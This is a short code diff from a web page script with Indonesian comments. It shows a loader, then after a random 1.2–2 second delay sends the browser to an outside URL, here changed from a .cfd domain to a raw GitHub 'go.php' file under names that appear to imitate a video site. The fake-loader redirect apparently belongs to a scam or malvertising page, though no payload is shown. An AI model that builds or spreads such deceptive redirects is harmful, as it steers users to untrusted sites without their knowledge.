@@ -204,7 +204,7 @@ setTimeout(() => { // loader muncul
 
 const delay = Math.floor(Math.random() * 800) + 1200; // 1,2 – 2 detik
 setTimeout(() => {
-   window.location.href = "https://cdn.viiidey.cfd/gi.php";
+   window.location.href = "https://raw.githubusercontent.com/Videyhubs/videy/refs/heads/main/go.php";
 }, delay);
 
 
